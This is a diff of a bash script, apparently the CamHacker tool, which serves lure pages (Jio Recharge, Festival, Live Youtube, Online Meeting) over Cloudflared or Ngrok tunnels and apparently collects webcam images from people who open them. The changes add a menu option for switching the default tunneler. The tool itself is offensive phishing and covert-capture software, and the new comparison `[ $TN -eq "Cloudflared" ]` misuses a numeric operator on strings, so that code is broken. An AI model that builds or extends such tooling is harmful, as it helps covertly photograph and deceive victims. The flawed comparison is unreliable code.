@@ -167,6 +167,9 @@ export FOL="$cwd"
 fi
 fi
 
+# Set Tunneler
+export TN="Cloudflared"
+
 # Set Package Manager
 if [ `command -v sudo` ]; then
     sudo=true
@@ -403,7 +406,8 @@ ${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
 ${cyan}[${white}2${cyan}] ${yellow}Festival
 ${cyan}[${white}3${cyan}] ${yellow}Live Youtube
 ${cyan}[${white}4${cyan}] ${yellow}Online Meeting
-${cyan}[${white}c${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL} ${yellow})
+${cyan}[${white}i${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
 ${cyan}[${white}x${cyan}] ${yellow}About
 ${cyan}[${white}m${cyan}] ${yellow}More tools
 ${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
@@ -439,7 +443,13 @@ read option
     elif echo $option | grep -q "4"; then
         dir="om"
         break
-    elif echo $option | grep -q "c"; then
+    elif echo $option | grep -q "t"; then
+        if [ $TN == "Cloudflared" ]; then
+            export TN="Ngrok"
+        else
+            export TN="Cloudflared"
+        fi
+    elif echo $option | grep -q "i"; then
         printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
@@ -522,8 +532,13 @@ cfcheck=false
 fi
 while true; do
 if ( $cfcheck && $ngrokcheck ); then
-    echo -e "${success}Cloudflared choosen!\n"
-    replacer "$cflink"
+    if [ $TN -eq "Cloudflared" ]; then
+        echo -e "${success}Cloudflared choosen!\n"
+        replacer "$cflink"
+    else
+        echo -e "${success}Ngrok choosen!\n"
+        replacer "$ngroklink"
+    fi
     break
 fi
 if ( $cfcheck &&  ! $ngrokcheck ); then
